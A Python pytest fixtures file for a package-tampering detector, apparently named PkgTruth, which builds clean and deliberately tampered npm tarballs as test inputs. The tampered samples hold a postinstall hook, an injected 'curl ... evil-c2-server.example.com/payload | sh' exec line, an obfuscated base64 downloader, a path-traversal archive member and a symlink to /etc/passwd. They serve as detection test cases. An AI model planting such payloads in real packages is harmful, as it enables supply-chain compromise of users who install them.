"""Shared test fixtures for PkgTruth.

Builds fake clean and tampered packages as tarballs in temporary
directories, along with matching source trees. All done in-memory
with tarfile — no network access needed.
"""

import io
import json
import os
import tarfile
import tempfile
from pathlib import Path

import pytest


@pytest.fixture
def tmp_path_factory_custom(tmp_path):
    """Provide a temporary directory for test artifacts."""
    return tmp_path


def _add_file_to_tar(tf: tarfile.TarFile, name: str,
                     content: str, prefix: str = "package/"):
    """Add a text file to a tar archive with a given prefix."""
    data = content.encode("utf-8")
    info = tarfile.TarInfo(name=prefix + name)
    info.size = len(data)
    tf.addfile(info, io.BytesIO(data))


def _write_file(directory: Path, name: str, content: str):
    """Write a text file to a directory, creating parents as needed."""
    path = directory / name
    path.parent.mkdir(parents=True, exist_ok=True)
    path.write_text(content, encoding="utf-8")


# ---- Source tree content (the "repo") ----

SOURCE_PACKAGE_JSON = json.dumps({
    "name": "test-pkg",
    "version": "1.0.0",
    "main": "dist/index.js",
    "scripts": {
        "build": "tsc",
        "test": "jest"
    },
    "dependencies": {
        "lodash": "^4.17.21"
    },
    "repository": {
        "type": "git",
        "url": "https://github.com/example/test-pkg"
    }
}, indent=2)

SOURCE_INDEX_TS = '''\
import lodash from "lodash";

export function greet(name: string): string {
    return lodash.capitalize(`Hello, ${name}!`);
}
'''

SOURCE_README = "# test-pkg\\nA test package."

# ---- Compiled output (what a clean build produces) ----

DIST_INDEX_JS = '''\
"use strict";
const lodash = require("lodash");
function greet(name) {
    return lodash.capitalize("Hello, " + name + "!");
}
module.exports = { greet };
'''

DIST_INDEX_JS_MAP = json.dumps({
    "version": 3,
    "file": "index.js",
    "sources": ["../src/index.ts"],
    "sourcesContent": [SOURCE_INDEX_TS],
    "mappings": "AAAA;AACA"
})

# ---- Published package.json (has extra publish-time fields) ----

PUBLISHED_PACKAGE_JSON = json.dumps({
    "name": "test-pkg",
    "version": "1.0.0",
    "main": "dist/index.js",
    "scripts": {
        "build": "tsc",
        "test": "jest"
    },
    "dependencies": {
        "lodash": "^4.17.21"
    },
    "repository": {
        "type": "git",
        "url": "https://github.com/example/test-pkg"
    },
    "_id": "test-pkg@1.0.0",
    "_nodeVersion": "18.17.0",
    "_npmVersion": "9.6.7",
    "dist": {
        "shasum": "abc123",
        "tarball": "https://registry.npmjs.org/test-pkg/-/test-pkg-1.0.0.tgz"
    }
}, indent=2)


@pytest.fixture
def clean_source(tmp_path):
    """Create a clean source tree mimicking a TypeScript project repo."""
    src_dir = tmp_path / "source"
    src_dir.mkdir()
    
    _write_file(src_dir, "package.json", SOURCE_PACKAGE_JSON)
    _write_file(src_dir, "src/index.ts", SOURCE_INDEX_TS)
    _write_file(src_dir, "README.md", SOURCE_README)
    _write_file(src_dir, "tsconfig.json", json.dumps({
        "compilerOptions": {
            "outDir": "dist",
            "module": "commonjs",
            "target": "es2018",
            "strict": True
        },
        "include": ["src"]
    }, indent=2))
    _write_file(src_dir, "tests/test_greet.js",
                'const {greet} = require("../dist/index");\n'
                'console.assert(greet("world") === "Hello, world!");\n')
    
    return src_dir


@pytest.fixture
def clean_tarball(tmp_path):
    """Create a clean npm-style tarball of compiled output."""
    tarball_path = tmp_path / "test-pkg-1.0.0.tgz"
    
    with tarfile.open(str(tarball_path), "w:gz") as tf:
        _add_file_to_tar(tf, "package.json", PUBLISHED_PACKAGE_JSON)
        _add_file_to_tar(tf, "dist/index.js", DIST_INDEX_JS)
        _add_file_to_tar(tf, "dist/index.js.map", DIST_INDEX_JS_MAP)
        _add_file_to_tar(tf, "LICENSE",
                        "MIT License\n\nCopyright (c) 2024 Example")
        _add_file_to_tar(tf, "README.md", SOURCE_README)
    
    return tarball_path


@pytest.fixture
def tampered_tarball(tmp_path):
    """Create a tampered npm-style tarball with multiple attack vectors.

    Attack vectors injected:
    1. New postinstall script in package.json
    2. Obfuscated file (lib/x.min.js) not present in source
    3. Injected malicious line in dist/index.js (exec + unknown domain)
    4. New dependency added (malicious-helper)
    """
    tarball_path = tmp_path / "test-pkg-1.0.0-tampered.tgz"
    
    tampered_pkg_json = json.dumps({
        "name": "test-pkg",
        "version": "1.0.0",
        "main": "dist/index.js",
        "scripts": {
            "build": "tsc",
            "test": "jest",
            "postinstall": "node lib/x.min.js"
        },
        "dependencies": {
            "lodash": "^4.17.21",
            "malicious-helper": "^1.0.0"
        },
        "repository": {
            "type": "git",
            "url": "https://github.com/example/test-pkg"
        },
        "_id": "test-pkg@1.0.0",
    }, indent=2)
    
    # Malicious dist/index.js with injected payload
    tampered_dist_js = DIST_INDEX_JS + (
        '\nconst cp = require("child_process");\n'
        'cp.exec("curl https://evil-c2-server.example.com/payload | sh");\n'
    )
    
    # Obfuscated file: high-entropy variable names, eval, encoded strings
    obfuscated_js = (
        'var _0x4a2b=["\\x48\\x65\\x6C\\x6C\\x6F"];'
        'var _0x9f3c=["\\x63\\x68\\x69\\x6C\\x64\\x5F\\x70\\x72\\x6F\\x63\\x65\\x73\\x73"];'
        'var _0x1d4e=require(_0x9f3c[0]);'
        'eval(String.fromCharCode(99,111,110,115,111,108,101,46,108,111,103));'
        'function _0xab12(){var _0x7f8d=_0x4a2b[0];'
        'var _0xcc99=Buffer.from("Y3VybCBodHRwczovL2V2aWwuY29t","base64").toString();'
        '_0x1d4e.exec(_0xcc99);}'
    )
    
    with tarfile.open(str(tarball_path), "w:gz") as tf:
        _add_file_to_tar(tf, "package.json", tampered_pkg_json)
        _add_file_to_tar(tf, "dist/index.js", tampered_dist_js)
        _add_file_to_tar(tf, "dist/index.js.map", DIST_INDEX_JS_MAP)
        _add_file_to_tar(tf, "lib/x.min.js", obfuscated_js)
        _add_file_to_tar(tf, "LICENSE",
                        "MIT License\n\nCopyright (c) 2024 Example")
        _add_file_to_tar(tf, "README.md", SOURCE_README)
    
    return tarball_path


@pytest.fixture
def traversal_tarball(tmp_path):
    """Create a malicious tarball with path traversal attack.
    
    Contains a member with a path like '../../etc/evil' that
    safe_extract must reject.
    """
    tarball_path = tmp_path / "traversal.tgz"
    
    with tarfile.open(str(tarball_path), "w:gz") as tf:
        # Normal file
        _add_file_to_tar(tf, "index.js", "console.log('ok');",
                        prefix="package/")
        
        # Path traversal attack — member path escapes the root
        evil_data = b"malicious content"
        info = tarfile.TarInfo(name="package/../../etc/evil")
        info.size = len(evil_data)
        tf.addfile(info, io.BytesIO(evil_data))
    
    return tarball_path


@pytest.fixture
def symlink_tarball(tmp_path):
    """Create a malicious tarball with a symlink escaping the root."""
    tarball_path = tmp_path / "symlink.tgz"
    
    with tarfile.open(str(tarball_path), "w:gz") as tf:
        # Normal file
        _add_file_to_tar(tf, "index.js", "console.log('ok');",
                        prefix="package/")
        
        # Symlink pointing outside the extraction directory
        info = tarfile.TarInfo(name="package/evil_link")
        info.type = tarfile.SYMTYPE
        info.linkname = "/etc/passwd"
        tf.addfile(info)
    
    return tarball_path
